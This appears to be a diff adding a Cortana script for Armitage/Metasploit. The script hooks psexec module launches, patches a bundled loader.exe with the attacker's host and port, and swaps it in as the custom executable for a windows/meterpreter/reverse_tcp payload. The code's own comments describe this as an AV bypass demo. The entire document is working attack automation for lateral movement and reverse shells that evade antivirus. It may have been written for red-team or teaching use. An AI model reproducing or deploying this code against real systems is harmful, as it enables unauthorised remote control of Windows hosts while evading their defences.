@@ -1,0 +1,59 @@
+# a cortana filter, fired when a user launches a module
+filter user_launch {
+	local('$custom_exe');
+
+	# is the user launching psexec of some sort? I want in :)
+	if ($2 eq "windows/smb/psexec" || $2 eq "windows/local/current_user_psexec") {
+		# has the user define a custom payload already? bail if they have.
+		if ($3['EXE::Custom'] ne "") {
+			return @_;
+		}
+
+		# this AV bypass demo is windows/meterpreter/reverse_tcp only...
+		if ($3['PAYLOAD'] ne "windows/meterpreter/reverse_tcp") {
+			println("[-] $2 / $3 is using an incompatible payload... doing nothing");
+			return @_;
+		}
+
+		# patch loader.exe with our host and port
+		$custom_exe = patch_loader_exe($3['LPORT']);
+
+		# upload the custom file to the team server (if there is one), store its path
+		$custom_exe = file_put($custom_exe);
+
+		# update the payload options to use our new executable
+		$3['EXE::Custom'] = $custom_exe;
+
+		# change the wait for session delay to a higher value
+		$3['WfsDelay']    = 60;
+	}
+
+	# return our original arguments. Changes to $3 will affect this array.
+	return @_;
+}
+
+sub patch_loader_exe {
+	local('$patch $handle $data $tempf');
+
+	# ok, let's create a patch for loader.exe with the desired host/port.
+	$patch = pack("Z20 I-", lhost(), $1);
+
+	# read in loader.exe
+	$handle = openf(script_resource("loader.exe"));
+	$data = readb($handle, -1);
+	closef($handle);
+
+	# patch it.
+	$data = strrep($data, "A" x 24, $patch);
+
+	# write out a temporary file.
+	$tempf = ticks() . ".exe";
+	$handle = openf("> $+ $tempf");
+	writeb($handle, $data);
+	closef($handle);
+
+	# delete our temp file when this app closes
+	delete_later($tempf);
+
+	return $tempf;
+}
